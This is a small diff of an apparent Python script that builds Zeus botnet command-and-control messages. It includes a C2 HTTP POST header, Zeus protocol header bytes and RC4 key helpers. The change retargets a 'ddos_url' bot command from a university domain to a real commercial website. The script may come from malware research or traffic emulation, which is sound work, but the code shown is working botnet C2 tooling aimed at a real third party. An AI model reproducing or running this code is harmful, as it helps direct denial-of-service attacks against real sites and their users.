@@ -39,10 +39,11 @@ def getZeusRC4Key():
 def getC2HttpHeader(contentLen):
 	r = "POST /write HTTP/1.1\r\n"
 	r += "Content-Length: %d\r\n" % (contentLen)
+	r += "Accpet-Encoding:\r\nConnection: close\r\nX-ID: 100\r\n"
 	return bytes(r, "ascii")
 
 def getZeusHeader():
-	r = b"\xA6\xEB\x00\xC2"
+	r = b"\xA6\xEB\x00\xCC"
 	m = hashlib.sha1()
 	m.update(b"Session #7859")
 	r += m.digest()
@@ -50,7 +51,7 @@ def getZeusHeader():
 	return r
 
 def getZeusCommandField():
-	r = b"ddos_url http://loccs.sjtu.edu.cn"
+	r = b"ddos_url http://us.blizzard.com/en-us/"
 	m = hashlib.md5()
 	m.update(r)
 	r = m.digest() + r
